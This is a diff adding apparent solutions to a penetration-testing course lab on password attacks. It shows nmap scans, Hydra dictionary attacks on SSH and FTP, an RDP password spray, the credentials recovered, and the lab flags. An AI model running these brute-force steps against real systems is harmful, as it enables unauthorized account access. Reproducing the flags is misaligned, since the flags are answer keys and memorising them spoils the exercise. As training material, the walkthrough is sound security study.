@@ -1,0 +1,68 @@
+Questions 1
+Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on VM #1 (BRUTE). Find the flag in the george user's home directory.
+
+sudo nmap -sV -p 2222 192.168.207.201 
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.207.201
+2222][ssh] host: 192.168.207.201   login: george   password: chocolate
+
+ssh george@192.168.207.201 -p 2222
+george@7c1e62256e69:~$ cat flag.txt
+OS{d8edd75ed738e77b8ad9d3716c2b3cd3}
+
+Questions 2
+Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on VM #2 (BRUTE2). Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames justin and daniel.
+
+nano /home/kali/Desktop/names.txt
+## Paste below names
+daniel
+justin
+
+hydra -L /home/kali/Desktop/names.txt -p "SuperS3cure1337#" rdp://192.168.207.202
+
+xfreerdp /u:justin /p:SuperS3cure1337# /v:192.168.207.202:3389
+type flag.txt
+OS{f39380dc7ad7fb50336976aa6b5cf2fc}
+
+Questions 3
+Enumerate VM #3 (BRUTE2) and find another network service. Use the knowledge from this section to get access as the itadmin user and find the flag.
+HINT
+Perform an Nmap scan to identify the different network service.
+Use the rockyou.txt wordlist. Ensure the target is set according to the different protocol.
+Cracking will only take a few seconds.
+Flag can be downloaded with the "get" command.
+
+sudo nmap -sV -p- 192.168.207.202
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp?
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+8000/tcp  open  http          Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+
+hydra -l "itadmin" -P /usr/share/wordlists/rockyou.txt -s 21 ftp://192.168.207.202
+[21][ftp] host: 192.168.207.202   login: itadmin   password: hellokitty
+
+ftp itadmin@192.168.207.202 
+ftp> get flag.txt
+ftp> exit
+┌──(root㉿kali)-[/home/kali/Desktop]
+└─# cat flag.txt           
+OS{b0e3a2b49b5782c5c848341b20021d62}
+
+
+
